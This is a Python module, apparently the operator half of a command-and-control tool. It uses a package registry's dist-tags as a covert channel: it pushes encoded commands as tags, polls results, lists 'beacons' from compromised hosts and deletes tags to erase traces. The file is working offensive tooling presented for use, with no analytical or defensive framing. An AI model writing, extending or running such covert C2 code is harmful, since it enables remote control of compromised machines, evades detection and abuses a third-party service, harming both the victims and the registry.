"""Operator side: push commands, read results, inspect beacons."""

from __future__ import annotations

import sys
import time

import requests

from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA, API
from . import encode_payload, group_chunks, registry_path


class RegistryError(RuntimeError):
    """The registry answered with an HTTP error the operator must see."""


class Operator:
    def __init__(self, package, token):
        self.package = package
        self.url = API.format(registry_path(package))
        self.s = requests.Session()
        self.s.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
        })

    # ------------------------------------------------------------ commands
    def push_task(self, command):
        ok = True
        for tag in encode_payload(command.encode(), CMD_PREFIX):
            try:
                r = self.s.put(f"{self.url}/{tag}", json=TAG_VALUE, timeout=20)
            except requests.RequestException as e:
                print(f"[-] {tag}: {e}", file=sys.stderr)
                return False
            if r.status_code >= 300:
                body = r.text[:120]
                print(f"[-] {tag}: HTTP {r.status_code} {body}", file=sys.stderr)
                ok = False
                break
            print(f"[+] {tag}")
        return ok

    # ------------------------------------------------------------- results
    def poll_results(self):
        tags = self._fetch()
        found = 0
        for buf, complete in group_chunks(tags, RES_PREFIX):
            if not complete:
                print("[!] incomplete result group, waiting for the next poll")
                continue
            found += 1
            print(f"[res] {buf.decode('utf-8', errors='replace')}")
            print("---")
        if not found:
            print("[i] no results")

    def watch(self, interval=5):
        seen: set[str] = set()
        print(f"[*] watching (every {interval}s)")
        try:
            while True:
                tags = self._fetch()
                fresh = [t for t in tags if t not in seen]
                seen.update(fresh)
                for buf, complete in group_chunks(fresh, RES_PREFIX):
                    if not complete:
                        continue
                    print(f"[{time.strftime('%H:%M:%S')}] "
                          f"{buf.decode('utf-8', errors='replace')}")
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] stopped")

    def list_beacons(self):
        names = [t for t in self._fetch() if t.startswith(HBT_PREFIX)]
        for n in sorted(names):
            print(f"[beacon] {n}")
        if not names:
            print("[i] no beacons")

    def stats(self):
        tags = self._fetch()
        cmds = [t for t in tags if t.startswith(CMD_PREFIX)]
        res = [t for t in tags if t.startswith(RES_PREFIX)]
        hbt = [t for t in tags if t.startswith(HBT_PREFIX)]
        print(f"pending: {len(cmds)}, results: {len(res)}, beacons: {len(hbt)}")
        for c in sorted(cmds)[:5]:
            print(f"  {c}")

    def clean_tags(self, all_tags=False):
        try:
            tags = self._fetch()
        except RegistryError as e:
            print(f"[-] {e}", file=sys.stderr)
            return
        targets = [n for n in tags
                   if (n != "latest" if all_tags
                       else n.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)))]
        count = 0
        for name in targets:
            try:
                r = self.s.delete(f"{self.url}/{name}", timeout=20)
            except requests.RequestException as e:
                print(f"[-] {name}: {e}", file=sys.stderr)
                continue
            if r.status_code < 300:
                count += 1
            else:
                print(f"[-] {name}: HTTP {r.status_code}", file=sys.stderr)
        print(f"[+] removed {count} tags" if count else "[i] nothing to clean")

    # ---------------------------------------------------------------- http
    def _fetch(self) -> dict:
        try:
            r = self.s.get(self.url, timeout=20)
        except requests.RequestException as e:
            raise RegistryError(f"GET {self.url}: {e}") from e
        if r.status_code == 404:
            raise RegistryError(f"package {self.package!r} not found (404)")
        if r.status_code in (401, 403):
            raise RegistryError(f"token rejected ({r.status_code})")
        if r.status_code >= 300:
            raise RegistryError(f"GET {self.url}: HTTP {r.status_code}")
        try:
            data = r.json()
        except ValueError as e:
            raise RegistryError(f"registry returned non-JSON: {e}") from e
        if not isinstance(data, dict):
            raise RegistryError("registry returned no dist-tags object")
        return data
